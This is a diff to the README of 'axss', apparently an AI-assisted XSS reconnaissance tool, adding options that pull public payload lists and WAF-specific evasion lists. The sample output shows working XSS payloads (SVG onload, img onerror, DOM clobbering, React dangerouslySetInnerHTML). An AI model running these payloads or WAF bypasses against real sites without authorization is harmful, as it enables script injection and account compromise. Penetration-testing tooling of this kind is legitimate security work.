@@ -7,7 +7,9 @@
 
 `axss` is a context-aware XSS recon CLI that parses target HTML, detects likely DOM sinks and framework fingerprints, then generates ranked payloads with an Ollama-first Qwen3.5 workflow plus heuristic fallback.
 
-Live crawling now uses a quiet Scrapy spider with selector-based parsing, which makes multi-URL recon less noisy and scales better than the earlier BeautifulSoup fetch path.
+`--public` pulls known XSS payloads from public and community sources and injects them as reference examples into the model prompt, so Qwen learns from real-world bypass patterns before generating target-specific payloads. `--waf` loads WAF-specific bypass lists and primes the model with evasion context; the WAF is auto-detected from response headers on live targets and can be overridden manually.
+
+Live crawling uses a quiet Scrapy spider with selector-based parsing, which makes multi-URL recon less noisy and scales better than the earlier BeautifulSoup fetch path.
 
 ## Why Qwen3.5
 
@@ -24,6 +26,11 @@ Qwen3.5 is a strong default for this project because the task is not just "write
 - Detects forms, inputs, inline scripts, DOM sinks, variables, objects, and framework fingerprints.
 - Uses Scrapy selectors for HTML extraction and a quiet `AxssSpider` for larger live recon runs.
 - Uses Ollama-first generation with Qwen3.5 model overrides via `-m, --model`.
+- `--public` fetches known XSS payloads from payloadbox, AwesomeXSS, community repos, and Nitter (best-effort), then injects a technique-diverse sample as reference examples into the model prompt so Qwen reasons from real bypass patterns rather than generating from scratch.
+- `--waf NAME` loads embedded bypass payload lists for the named WAF and tells the model to prioritise matching evasion techniques. Auto-detected from response headers on live targets; use the flag to override or set manually. Supported: `cloudflare`, `akamai`, `imperva`, `aws`, `f5`, `modsecurity`, `fastly`, `sucuri`, `barracuda`, `wordfence`, `azure`.
+- `--public` is also usable standalone (no target required) to dump a filtered public payload list.
+- Fetched payload lists are cached in `~/.cache/axss/` with a 24-hour TTL (6 hours for social sources).
+- Color-coded output: risk scores are red / yellow / green by severity; step-by-step progress indicators are always visible during a run.
 - Lists local models with `-l, --list-models` and searches model names with `-s, --search-models QUERY`.
 - Ranks payloads in `list`, `heat`, or `json` output modes.
 - Ships with `setup.sh`, which installs Ollama with the official curl script when needed, auto-selects a Qwen3.5 tier, pulls it, creates `~/.axss/config.json`, builds the venv, and symlinks `~/.local/bin/axss`.
@@ -162,7 +169,31 @@ Force the smaller Qwen3.5 model when you want lower memory usage:
 axss -u https://example.com -m qwen3.5:4b -o list -t 5
 ```
 
-Show stage-by-stage progress while scanning a local target:
+Fetch public payloads and scan a live target with WAF context:
+
+```bash
+axss -u https://example.com --public --waf cloudflare -o heat
+```
+
+Dump all public payloads for a specific WAF without a target:
+
+```bash
+axss --public --waf modsecurity -o list
+```
+
+Dump all public payloads standalone:
+
+```bash
+axss --public -o list
+```
+
+Scan a live target — WAF is auto-detected from response headers:
+
+```bash
+axss -u https://example.com --public -o list -t 15
+```
+
+Show detailed sub-step progress while scanning a local target:
 
 ```bash
 axss -v -i sample_target.html -t 5 -o list
@@ -178,43 +209,47 @@ Run the bundled demo:
 
 ```text
 $ axss --help
-usage: axss [-h] (-u TARGET | --urls FILE | -i FILE_OR_SNIPPET | -l | -s QUERY)
-            [-m MODEL] [-o {json,list,heat}] [-t N] [-j PATH] [-v]
-            [--merge-batch] [-V]
+usage: axss [-h] [-u TARGET | --urls FILE | -i FILE_OR_SNIPPET | -l | -s QUERY]
+            [--public] [--waf NAME] [-m MODEL] [-o {json,list,heat}] [-t N]
+            [-j PATH] [-v] [--merge-batch] [-V]
 
 Parse local or live HTML, identify likely XSS execution points, and rank payloads with Ollama-first generation.
 
 options:
   -h, --help            Show this help message and exit.
-  -u, --url TARGET      --url TARGET (fetch live HTML), e.g. -u
-                        https://example.com
-  --urls FILE           --urls FILE (fetch one URL per line), e.g. --urls
-                        urls.txt
+  -u, --url TARGET      --url TARGET (fetch live HTML), e.g. -u https://example.com
+  --urls FILE           --urls FILE (fetch one URL per line), e.g. --urls urls.txt
   -i, --input FILE_OR_SNIPPET
-                        --input FILE_OR_SNIPPET (parse a local file or raw
-                        HTML), e.g. -i sample_target.html
-  -l, --list-models     --list-models (show locally available Ollama models),
-                        e.g. -l
+                        --input FILE_OR_SNIPPET (parse a local file or raw HTML),
+                        e.g. -i sample_target.html
+  -l, --list-models     --list-models (show locally available Ollama models), e.g. -l
   -s, --search-models QUERY
-                        --search-models QUERY (search Ollama model names),
-                        e.g. -s qwen3.5
-  -m, --model MODEL     --model MODEL (override the Ollama model), e.g. -m
-                        qwen3.5:4b
+                        --search-models QUERY (search Ollama model names), e.g. -s qwen3.5
+  --public              Fetch known XSS payloads from public/community sources and inject
+                        them as reference context into the model prompt. Can be used
+                        standalone (no target required) to dump a payload list.
+  --waf NAME            Target WAF (akamai, aws, azure, barracuda, cloudflare, f5,
+                        fastly, imperva, modsecurity, sucuri, wordfence). Auto-detected
+                        from response headers when -u/--urls is used; use this flag to
+                        override or set manually.
+  -m, --model MODEL     --model MODEL (override the Ollama model), e.g. -m qwen3.5:4b
   -o, --output {json,list,heat}
                         --output {json,list,heat} (choose terminal format),
                         e.g. -o list (default: list)
-  -t, --top N           --top N (limit ranked payloads), e.g. -t 10 (default:
-                        20)
+  -t, --top N           --top N (limit ranked payloads), e.g. -t 10 (default: 20)
   -j, --json-out PATH   --json-out PATH (always write the full JSON result),
                         e.g. -j result.json
-  -v, --verbose         --verbose (print stage-by-stage progress), e.g. -v -i
-                        sample_target.html
-  --merge-batch         --merge-batch (combine batch contexts into one payload
-                        set), e.g. --urls urls.txt --merge-batch
+  -v, --verbose         --verbose (print detailed sub-step progress),
+                        e.g. -v -i sample_target.html
+  --merge-batch         --merge-batch (combine batch contexts into one payload set),
+                        e.g. --urls urls.txt --merge-batch
   -V, --version         show program's version number and exit
 
 Common combos:
   axss -u https://example.com -t 10 -o list
+  axss -u https://example.com --public --waf cloudflare -o heat
+  axss --public --waf modsecurity -o list
+  axss --public -o list
   axss --urls urls.txt -t 5 -o list
   axss --urls urls.txt --merge-batch -o json -j result.json
   axss -u https://example.com -m qwen3.5:9b -o list -t 3
@@ -230,16 +265,33 @@ Common combos:
 
 ## Terminal Preview
 
-Sample run against `sample_target.html`:
+Sample run with `--public` and WAF context against a live target:
 
 ```text
-$ ./axss -v -i sample_target.html -o heat -t 8
-Fetching/parsing target...
-Fetching target: sample_target.html...
-Loading model...
-Generating payloads...
-Ranking/mutating...
-Rendering output...
+$ axss -u https://example.com --public --waf cloudflare -o heat -t 8
+[*] Fetching public XSS payloads...
+[+] Loaded 847 public payloads (2 cached) — public_payloadbox=650, social_awesomexss=185, waf_cloudflare=12
+[*] Probing for WAF on https://example.com...
+[+] WAF detected: cloudflare
+[*] Fetching/parsing target: https://example.com
+[*] Generating payloads with qwen3.5:9b...
+[~] WAF context: cloudflare
+[~] Reference payloads: 20 examples loaded into prompt.
+[+] Done. 51 payloads ranked.
+
+Target: https://example.com (url) | engine=ollama | model=qwen3.5:9b | fallback=False | waf=cloudflare
+...
+```
+
+Sample run against a local file:
+
+```text
+$ axss -i sample_target.html -o heat -t 8
+[*] Fetching/parsing target: sample_target.html
+[*] Generating payloads with qwen3.5:9b...
+[~] No WAF fingerprint detected — use --waf to set manually.
+[+] Done. 43 payloads ranked.
+
 Target: file:sample_target.html (html) | engine=heuristic | model=qwen3.5:9b | fallback=True
 title=XSS Demo Target | frameworks=React | forms=1 | inputs=3 | handlers=0 | sinks=4
 notes: Parsed HTML with Scrapy selectors. Parsed scripts with esprima AST.
@@ -250,15 +302,8 @@ notes: Parsed HTML with Scrapy selectors. Parsed scripts with esprima AST.
 3 | 60   | {"__html":"<img src=x onerror=alert(1)>"}    | dangerouslySetInner… | React dangerouslySetInn…
 4 | 52   | "><svg/onload=alert(document.domain)>        | polyglot,attribute-… | SVG onload break-out
 5 | 52   | ';document.body.innerHTML='<img src=x onerr… | chain,innerHTML      | Script-to-DOM chain
-6 | 52   | <math><mtext><img src=x onerror=alert(1)>    | mathml,polyglot      | MathML wrapper
-7 | 52   | <svg><script>alert(1)</script>               | svg,script-tag       | SVG script block
-8 | 47   | alert?.(1)//                                 | setTimeout           | Timer string execution …
 
- 1.  72 ##################        DOM clobber + property si… <form id=forms><input name=innerHTM…
- 2.  62 ################          innerHTML SVG animate      <svg><animate onbegin=alert(1) attr…
- 3.  60 ###############           React dangerouslySetInner… {"__html":"<img src=x onerror=alert…
- 4.  52 #############             SVG onload break-out       "><svg/onload=alert(document.domain…
- 5.  52 #############             Script-to-DOM chain        ';document.body.innerHTML='<img src…
+Risk scores are color-coded in the terminal: red (>=75), yellow (>=50), green (<50).
 ```
 
 ### Payload table preview
